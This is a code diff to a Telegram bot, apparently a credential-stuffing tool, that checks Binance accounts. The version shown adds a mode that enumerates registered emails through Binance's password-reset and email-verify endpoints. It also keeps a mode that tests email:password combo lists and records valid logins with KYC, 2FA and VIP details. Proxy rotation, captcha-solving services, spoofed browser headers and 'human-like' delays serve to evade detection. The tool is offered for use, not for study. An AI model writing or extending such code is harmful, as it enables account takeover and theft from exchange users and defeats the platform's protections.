@@ -5,6 +5,8 @@ Advanced Telegram bot for checking Binance accounts with multi-proxy and captcha
 
 Features:
 - Interactive Telegram interface
+- Email-only validation mode (check if email is registered without password)
+- Full account validation mode (check email:password combos)
 - Extended proxy support (HTTP/HTTPS/SOCKS4/SOCKS5/Residential/Datacenter/Rotating)
 - Authenticated proxy support (user:pass format)
 - 10 captcha services (2Captcha/Anti-Captcha/CapMonster/DeathByCaptcha/ImageTyperz/AZCaptcha/CaptchaCoder/CapSolver/TrueCaptcha)
@@ -16,7 +18,7 @@ Features:
 - Proxy rotation control
 
 Author: legendhkek
-Version: 2.0.0
+Version: 2.1.0
 """
 
 import asyncio
@@ -106,12 +108,19 @@ class CaptchaService(Enum):
     TRUECAPTCHA = "truecaptcha"
 
 
+class ValidationMode(Enum):
+    """Validation modes"""
+    EMAIL_ONLY = "email_only"
+    FULL_ACCOUNT = "full_account"
+
+
 @dataclass
 class CheckResult:
     """Result of a single check"""
     email: str
-    password: str
+    password: Optional[str]
     status: str
+    is_registered: Optional[bool] = None  # For email-only mode
     email_verified: Optional[bool] = None
     kyc_status: Optional[str] = None
     two_fa_enabled: Optional[bool] = None
@@ -132,12 +141,13 @@ class CheckResult:
 class UserSession:
     """User session data"""
     user_id: int
-    combos: List[Tuple[str, str]] = None
+    combos: List[Tuple[str, Optional[str]]] = None  # email and optional password
     proxies: List[str] = None
     proxy_type: ProxyType = ProxyType.HTTP
     proxy_category: ProxyCategory = ProxyCategory.DATACENTER
     captcha_service: CaptchaService = CaptchaService.NONE
     captcha_api_key: str = ""
+    validation_mode: ValidationMode = ValidationMode.EMAIL_ONLY
     use_advanced_evasion: bool = True
     retry_on_captcha: bool = True
     max_captcha_retries: int = 3
@@ -541,6 +551,79 @@ class BinanceChecker:
                 await asyncio.sleep(5)
         return None
     
+    async def check_email_registered(self, email: str) -> CheckResult:
+        """Check if an email is registered on Binance (email-only mode)"""
+        result = CheckResult(email=email, password=None, status="checking")
+        
+        try:
+            proxy = self.get_next_proxy()
+            timeout = aiohttp.ClientTimeout(total=30)
+            
+            async with aiohttp.ClientSession(timeout=timeout) as session:
+                # Use Binance's password reset endpoint to check if email exists
+                headers = {
+                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                    'Accept': 'application/json, text/plain, */*',
+                    'Accept-Language': 'en-US,en;q=0.9',
+                    'Content-Type': 'application/json',
+                    'Origin': self.BASE_URL,
+                    'Referer': f'{self.BASE_URL}/en/support/account/forgot-password',
+                }
+                
+                await asyncio.sleep(0.5)  # Human-like delay
+                
+                # Try password reset endpoint
+                reset_data = {
+                    "email": email,
+                    "clientType": "web"
+                }
+                
+                async with session.post(
+                    f"{self.BASE_URL}/bapi/accounts/v1/public/account/forgot-password/email",
+                    json=reset_data,
+                    headers=headers,
+                    proxy=proxy.get('http') if proxy else None
+                ) as resp:
+                    response_data = await resp.json()
+                    
+                    # Binance returns success for valid emails, error for invalid
+                    if response_data.get('success') or response_data.get('code') == '000000':
+                        # Email is registered
+                        result.status = "registered"
+                        result.is_registered = True
+                    elif 'not found' in str(response_data).lower() or 'not exist' in str(response_data).lower():
+                        # Email not registered
+                        result.status = "not_registered"
+                        result.is_registered = False
+                    else:
+                        # Try registration check endpoint as backup
+                        check_data = {"email": email}
+                        async with session.post(
+                            f"{self.BASE_URL}/bapi/accounts/v1/public/account/email/verify",
+                            json=check_data,
+                            headers=headers,
+                            proxy=proxy.get('http') if proxy else None
+                        ) as check_resp:
+                            check_response = await check_resp.json()
+                            
+                            # If email already exists, it's registered
+                            if 'already' in str(check_response).lower() or 'exist' in str(check_response).lower():
+                                result.status = "registered"
+                                result.is_registered = True
+                            else:
+                                result.status = "not_registered"
+                                result.is_registered = False
+                        
+        except asyncio.TimeoutError:
+            result.status = "error"
+            result.error_message = "Request timeout"
+        except Exception as e:
+            result.status = "error"
+            result.error_message = str(e)
+            logger.error(f"Email check error for {email}: {e}")
+        
+        return result
+    
     async def check_account(self, email: str, password: str) -> CheckResult:
         """Check a single Binance account"""
         result = CheckResult(email=email, password=password, status="checking")
@@ -746,19 +829,25 @@ class BinanceTelegramBot:
             "/status - Show current checking status\n"
             "/cancel - Cancel current operation\n"
             "/help - Show this help message\n\n"
+            "*Validation Modes:*\n"
+            "📧 *Email Only:* Check if email is registered (no password needed)\n"
+            "🔐 *Full Account:* Validate email:password combinations\n\n"
             "*Usage Flow:*\n"
-            "1️⃣ Upload combo list (email:password format)\n"
-            "2️⃣ Upload proxy list (ip:port or ip:port:user:pass)\n"
-            "3️⃣ Configure settings (proxy type, captcha service)\n"
-            "4️⃣ Start checking\n"
-            "5️⃣ View results\n\n"
+            "1️⃣ Configure validation mode (Email Only by default)\n"
+            "2️⃣ Upload email list or combo list\n"
+            "3️⃣ Upload proxy list (ip:port or ip:port:user:pass)\n"
+            "4️⃣ Configure settings (proxy type, captcha service)\n"
+            "5️⃣ Start checking\n"
+            "6️⃣ View results\n\n"
             "*Supported Formats:*\n"
-            "• Combos: `email:password` (one per line)\n"
+            "• Email Only: `email@example.com` (one per line)\n"
+            "• Full Account: `email:password` (one per line)\n"
             "• Proxies: `ip:port` or `ip:port:user:pass`\n\n"
             "*Captcha Services:*\n"
             "• 2Captcha (~$2.99/1000)\n"
             "• Anti-Captcha (~$2.00/1000)\n"
-            "• CapMonster (~$1.00/1000)"
+            "• CapMonster (~$1.00/1000)\n"
+            "• +6 more services"
         )
         
         await update.message.reply_text(help_text, parse_mode='Markdown')
@@ -805,15 +894,30 @@ class BinanceTelegramBot:
         action = query.data
         
         if action == "upload_combos":
-            await query.edit_message_text(
-                "📤 *Upload Combo List*\n\n"
-                "Send me your combo list as a text file or paste directly.\n"
-                "Format: `email:password` (one per line)\n\n"
-                "Example:\n"
-                "`user1@example.com:password123`\n"
-                "`user2@gmail.com:pass456`",
-                parse_mode='Markdown'
-            )
+            user_id = query.from_user.id
+            session = self.get_session(user_id)
+            
+            if session.validation_mode == ValidationMode.EMAIL_ONLY:
+                await query.edit_message_text(
+                    "📤 *Upload Email List*\n\n"
+                    "Send me your email list as a text file or paste directly.\n"
+                    "Format: `email` (one per line)\n\n"
+                    "Example:\n"
+                    "`user1@example.com`\n"
+                    "`user2@gmail.com`\n"
+                    "`user3@yahoo.com`",
+                    parse_mode='Markdown'
+                )
+            else:
+                await query.edit_message_text(
+                    "📤 *Upload Combo List*\n\n"
+                    "Send me your combo list as a text file or paste directly.\n"
+                    "Format: `email:password` (one per line)\n\n"
+                    "Example:\n"
+                    "`user1@example.com:password123`\n"
+                    "`user2@gmail.com:pass456`",
+                    parse_mode='Markdown'
+                )
             return States.UPLOAD_COMBO.value
         
         elif action == "upload_proxies":
@@ -842,7 +946,7 @@ class BinanceTelegramBot:
             return States.MAIN_MENU.value
     
     async def handle_combo_upload(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-        """Handle combo list upload"""
+        """Handle combo/email list upload"""
         user_id = update.effective_user.id
         session = self.get_session(user_id)
         
@@ -856,24 +960,38 @@ class BinanceTelegramBot:
         else:
             text = update.message.text
         
-        # Parse combos
+        # Parse combos or emails based on validation mode
         for line in text.strip().split('\n'):
             line = line.strip()
-            if ':' in line:
-                parts = line.split(':', 1)
-                if len(parts) == 2:
-                    email, password = parts
-                    if '@' in email:
-                        combos.append((email.strip(), password.strip()))
+            if not line or line.startswith('#'):
+                continue
+                
+            if session.validation_mode == ValidationMode.EMAIL_ONLY:
+                # Email-only mode: just email addresses
+                if '@' in line and ':' not in line:
+                    combos.append((line.strip(), None))
+                elif ':' in line:
+                    # Also accept email:password format but ignore password
+                    parts = line.split(':', 1)
+                    if '@' in parts[0]:
+                        combos.append((parts[0].strip(), None))
+            else:
+                # Full account mode: email:password
+                if ':' in line:
+                    parts = line.split(':', 1)
+                    if len(parts) == 2 and '@' in parts[0]:
+                        combos.append((parts[0].strip(), parts[1].strip()))
         
         if not combos:
-            await update.message.reply_text("❌ No valid combos found. Please check the format.")
+            mode_text = "emails" if session.validation_mode == ValidationMode.EMAIL_ONLY else "combos"
+            await update.message.reply_text(f"❌ No valid {mode_text} found. Please check the format.")
             return States.UPLOAD_COMBO.value
         
         session.combos = combos
         
+        mode_desc = "emails" if session.validation_mode == ValidationMode.EMAIL_ONLY else "combos"
         await update.message.reply_text(
-            f"✅ Loaded {len(combos)} combos successfully!\n\n"
+            f"✅ Loaded {len(combos)} {mode_desc} successfully!\n\n"
             f"Use /start to return to main menu.",
             reply_markup=ReplyKeyboardRemove()
         )
@@ -920,8 +1038,10 @@ class BinanceTelegramBot:
         user_id = query.from_user.id
         session = self.get_session(user_id)
         
+        mode_str = "Email Only" if session.validation_mode == ValidationMode.EMAIL_ONLY else "Full Account"
         config_text = (
             f"⚙️ *Current Configuration*\n\n"
+            f"🔍 Validation Mode: `{mode_str}`\n"
             f"🌐 Proxy Type: `{session.proxy_type.value.upper()}`\n"
             f"📦 Proxy Category: `{session.proxy_category.value.upper()}`\n"
             f"🔐 Captcha Service: `{session.captcha_service.value.upper()}`\n"
@@ -934,6 +1054,7 @@ class BinanceTelegramBot:
         )
         
         keyboard = [
+            [InlineKeyboardButton("🔍 Change Validation Mode", callback_data="set_validation_mode")],
             [InlineKeyboardButton("🌐 Change Proxy Type", callback_data="set_proxy_type")],
             [InlineKeyboardButton("📦 Change Proxy Category", callback_data="set_proxy_category")],
             [InlineKeyboardButton("🔐 Change Captcha Service", callback_data="set_captcha")],
@@ -964,7 +1085,24 @@ class BinanceTelegramBot:
         session = self.get_session(user_id)
         action = query.data
         
-        if action == "set_proxy_type":
+        if action == "set_validation_mode":
+            keyboard = [
+                [InlineKeyboardButton("📧 Email Only", callback_data="mode_email_only")],
+                [InlineKeyboardButton("🔐 Full Account (Email:Password)", callback_data="mode_full_account")],
+                [InlineKeyboardButton("◀️ Back", callback_data="back_config")]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.edit_message_text(
+                "🔍 *Select Validation Mode*\n\n"
+                "📧 *Email Only:* Check if email is registered (no password needed)\n"
+                "🔐 *Full Account:* Validate email:password combos\n\n"
+                "Choose mode:",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+            return States.CONFIGURE_SETTINGS.value
+        
+        elif action == "set_proxy_type":
             keyboard = [
                 [InlineKeyboardButton("HTTP", callback_data="proxy_http")],
                 [InlineKeyboardButton("HTTPS", callback_data="proxy_https")],
@@ -1051,6 +1189,15 @@ class BinanceTelegramBot:
             category = action.replace("category_", "")
             session.proxy_category = ProxyCategory(category)
             await query.answer(f"Proxy category set to: {category.upper()}")
+            return await self.show_configuration_menu(query)
+        
+        elif action.startswith("mode_"):
+            mode = action.replace("mode_", "")
+            session.validation_mode = ValidationMode(mode)
+            mode_name = "Email Only" if mode == "email_only" else "Full Account"
+            await query.answer(f"Validation mode set to: {mode_name}")
+            # Clear existing combos when changing mode
+            session.combos = []
             return await self.show_configuration_menu(query)
         
         elif action == "back_config":
@@ -1191,16 +1338,30 @@ class BinanceTelegramBot:
         
         async def check_with_semaphore(email, password):
             async with semaphore:
-                result = await checker.check_account(email, password)
+                # Use appropriate check method based on validation mode
+                if session.validation_mode == ValidationMode.EMAIL_ONLY:
+                    result = await checker.check_email_registered(email)
+                else:
+                    result = await checker.check_account(email, password)
+                    
                 session.results.append(result)
                 session.progress['checked'] += 1
                 
-                if result.status == "valid":
-                    session.progress['valid'] += 1
-                elif result.status == "invalid":
-                    session.progress['invalid'] += 1
+                # Update counters based on mode
+                if session.validation_mode == ValidationMode.EMAIL_ONLY:
+                    if result.status == "registered":
+                        session.progress['valid'] += 1
+                    elif result.status == "not_registered":
+                        session.progress['invalid'] += 1
+                    else:
+                        session.progress['errors'] += 1
                 else:
-                    session.progress['errors'] += 1
+                    if result.status == "valid":
+                        session.progress['valid'] += 1
+                    elif result.status == "invalid":
+                        session.progress['invalid'] += 1
+                    else:
+                        session.progress['errors'] += 1
                 
                 # Send progress updates every 10 checks
                 if session.progress['checked'] % 10 == 0:
@@ -1279,27 +1440,47 @@ class BinanceTelegramBot:
             f.write("BINANCE EMAIL VALIDATOR - RESULTS\n")
             f.write("="*60 + "\n\n")
             
-            valid_results = [r for r in session.results if r.status == "valid"]
-            
-            if valid_results:
-                f.write(f"VALID ACCOUNTS ({len(valid_results)})\n")
-                f.write("-"*60 + "\n")
-                for result in valid_results:
-                    f.write(f"\nEmail: {result.email}\n")
-                    f.write(f"Password: {result.password}\n")
-                    if result.email_verified is not None:
-                        f.write(f"Email Verified: {result.email_verified}\n")
-                    if result.kyc_status:
-                        f.write(f"KYC Status: {result.kyc_status}\n")
-                    if result.two_fa_enabled is not None:
-                        f.write(f"2FA Enabled: {result.two_fa_enabled}\n")
-                    if result.vip_level is not None:
-                        f.write(f"VIP Level: {result.vip_level}\n")
-                    if result.country:
-                        f.write(f"Country: {result.country}\n")
-                    if result.account_status:
-                        f.write(f"Status: {result.account_status}\n")
+            if session.validation_mode == ValidationMode.EMAIL_ONLY:
+                # Email-only mode: show registered emails
+                registered_results = [r for r in session.results if r.status == "registered"]
+                not_registered_results = [r for r in session.results if r.status == "not_registered"]
+                
+                if registered_results:
+                    f.write(f"REGISTERED EMAILS ({len(registered_results)})\n")
                     f.write("-"*60 + "\n")
+                    for result in registered_results:
+                        f.write(f"{result.email}\n")
+                    f.write("-"*60 + "\n\n")
+                
+                if not_registered_results:
+                    f.write(f"NOT REGISTERED EMAILS ({len(not_registered_results)})\n")
+                    f.write("-"*60 + "\n")
+                    for result in not_registered_results:
+                        f.write(f"{result.email}\n")
+                    f.write("-"*60 + "\n\n")
+            else:
+                # Full account mode: show valid accounts
+                valid_results = [r for r in session.results if r.status == "valid"]
+                
+                if valid_results:
+                    f.write(f"VALID ACCOUNTS ({len(valid_results)})\n")
+                    f.write("-"*60 + "\n")
+                    for result in valid_results:
+                        f.write(f"\nEmail: {result.email}\n")
+                        f.write(f"Password: {result.password}\n")
+                        if result.email_verified is not None:
+                            f.write(f"Email Verified: {result.email_verified}\n")
+                        if result.kyc_status:
+                            f.write(f"KYC Status: {result.kyc_status}\n")
+                        if result.two_fa_enabled is not None:
+                            f.write(f"2FA Enabled: {result.two_fa_enabled}\n")
+                        if result.vip_level is not None:
+                            f.write(f"VIP Level: {result.vip_level}\n")
+                        if result.country:
+                            f.write(f"Country: {result.country}\n")
+                        if result.account_status:
+                            f.write(f"Status: {result.account_status}\n")
+                        f.write("-"*60 + "\n")
             
             f.write(f"\n\nSUMMARY\n")
             f.write("-"*60 + "\n")
